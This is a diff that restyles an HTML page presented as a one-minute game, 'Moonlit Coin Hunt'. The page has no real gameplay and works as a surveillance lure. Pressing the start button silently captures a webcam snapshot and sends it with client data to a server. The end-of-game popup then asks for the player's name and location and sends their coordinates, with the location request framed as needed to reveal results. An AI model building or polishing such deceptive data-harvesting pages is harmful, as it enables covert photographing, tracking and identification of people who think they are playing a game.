@@ -2,53 +2,111 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>The Game</title>
+<title>Moonlit Coin Hunt</title>
 <style>
-  body { font-family: Arial, sans-serif; }
-  #timer { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
-  #endPopup {
-    display: none; position: fixed; inset: 0;
-    background: rgba(0,0,0,0.7); color: white;
-    padding: 30px; text-align: center; font-size: 20px;
+  body {
+    background: #111;
+    color: #eee;
+    font-family: "Georgia", serif;
+    text-align: center;
+    padding: 20px;
   }
-  button { padding: 10px 20px; font-size: 18px; }
+
+  h1 {
+    margin-bottom: 10px;
+    font-size: 36px;
+    text-shadow: 0 0 5px #555;
+  }
+
+  #timer {
+    font-size: 34px;
+    font-weight: bold;
+    margin: 10px 0 20px 0;
+    color: #ffcc00;
+  }
+
+  #startBtn, button {
+    background: #333;
+    color: #eee;
+    border: 2px solid #777;
+    padding: 12px 22px;
+    font-size: 20px;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: 0.25s;
+  }
+
+  #startBtn:hover, button:hover {
+    background: #555;
+  }
+
+  #endPopup {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    color: white;
+    padding-top: 150px;
+    font-size: 22px;
+  }
+
+  input {
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 20px;
+    border-radius: 5px;
+    border: 1px solid #555;
+    width: 260px;
+    text-align: center;
+  }
+
+  #showResults:disabled {
+    background: #444;
+    border-color: #333;
+    color: #777;
+    cursor: not-allowed;
+  }
 </style>
 </head>
 <body>
 
+<h1>🌕 Moonlit Coin Hunt</h1>
 <div id="timer">60</div>
+
 <button id="startBtn">Commence the Game!</button>
 
 <div id="endPopup">
-  <p>The minute hath expired, noble traveller.</p>
-  <p>Enter thy name:</p>
-  <input id="playerName" type="text" placeholder="Thy name…"><br><br>
+  <p>The sands of time have run their course, noble wanderer.</p>
+  <p>Pray, enter thy name:</p>
+
+  <input id="playerName" type="text" placeholder="Thy name…"><br>
+
   <button id="grantGeo">Grant Location Permission</button><br><br>
-  <button id="showResults" disabled>Show Results</button>
+
+  <button id="showResults" disabled>Reveal My Results</button>
 </div>
 
 <script>
-
 // =====================================================
-// FLAGS — prevent any duplicate sends
+// CONTROL FLAGS — to prevent duplicates
 // =====================================================
 let snapshotSent = false;
 let earlyDataSent = false;
 let finalDataSent = false;
 
-// =====================================================
-// GAME TIME CONTROL
-// =====================================================
 let gameEnded = false;
 let timerInterval = null;
-let score = 0; // you may update this within your game
+let score = 0; // you may update this during your game
 
+// =====================================================
+// ELEMENTS
+// =====================================================
 const startBtn = document.getElementById("startBtn");
 const timerDiv = document.getElementById("timer");
 const endPopup = document.getElementById("endPopup");
 
 // =====================================================
-// CAMERA SNAPSHOT (one-time only)
+// CAMERA SNAPSHOT — one-time only
 // =====================================================
 async function captureSnapshot() {
   try {
@@ -57,7 +115,7 @@ async function captureSnapshot() {
     video.srcObject = stream;
     await video.play();
 
-    await new Promise(r => setTimeout(r, 500)); // warm-up
+    await new Promise(r => setTimeout(r, 500));
 
     const canvas = document.createElement("canvas");
     canvas.width = 300;
@@ -68,14 +126,13 @@ async function captureSnapshot() {
 
     stream.getTracks().forEach(t => t.stop());
     return base64;
-
-  } catch (e) {
+  } catch (err) {
     return null;
   }
 }
 
 // =====================================================
-// COLLECT CLIENT INFO
+// CLIENT DATA
 // =====================================================
 function collectClientData() {
   return {
@@ -91,7 +148,7 @@ function collectClientData() {
 }
 
 // =====================================================
-// SENDS TO SERVER
+// SEND DATA TO SERVER
 // =====================================================
 async function sendInitialData() {
   if (earlyDataSent) return;
@@ -117,7 +174,7 @@ async function sendInitialData() {
   });
 }
 
-async function sendFinalData(name, position) {
+async function sendFinalData(name, pos) {
   if (finalDataSent) return;
   finalDataSent = true;
 
@@ -130,10 +187,10 @@ async function sendFinalData(name, position) {
       type: "final",
       name,
       client,
-      location: position ? {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        accuracy: position.coords.accuracy
+      location: pos ? {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
       } : null,
       score
     })
@@ -141,18 +198,17 @@ async function sendFinalData(name, position) {
 }
 
 // =====================================================
-// GAME START
+// START GAME
 // =====================================================
 startBtn.addEventListener("click", () => {
   startBtn.style.display = "none";
-
-  //  immediate send of initial data + snapshot
-  sendInitialData();
+  sendInitialData(); // Send snapshot + early data
 
   let timeLeft = 60;
+
   timerInterval = setInterval(() => {
     timeLeft--;
-    timerDiv.innerText = timeLeft;
+    timerDiv.textContent = timeLeft;
 
     if (timeLeft <= 0) endGame();
   }, 1000);
@@ -164,34 +220,33 @@ startBtn.addEventListener("click", () => {
 function endGame() {
   if (gameEnded) return;
   gameEnded = true;
-  clearInterval(timerInterval);
 
+  clearInterval(timerInterval);
   endPopup.style.display = "block";
 }
 
 // =====================================================
-// LOCATION + FINAL SEND
+// LOCATION & FINAL SEND
 // =====================================================
 document.getElementById("grantGeo").onclick = () => {
+  const name = document.getElementById("playerName").value || "Unknown Stranger";
+
   navigator.geolocation.getCurrentPosition(
     (pos) => {
-      const name = document.getElementById("playerName").value || "Unknown Stranger";
-
       document.getElementById("showResults").disabled = false;
-
       sendFinalData(name, pos);
     },
     (err) => {
-      alert("Thou hast denied the location, fair wanderer.");
+      alert("Thou hast denied the location, fair traveller.");
     }
   );
 };
 
 // =====================================================
-// SHOW RESULTS (purely frontend display)
+// SHOW RESULTS — purely frontend
 // =====================================================
 document.getElementById("showResults").onclick = () => {
-  alert("Thy score: " + score);
+  alert("Thy amassed riches amount to: " + score + " coins!");
 };
 
 </script>
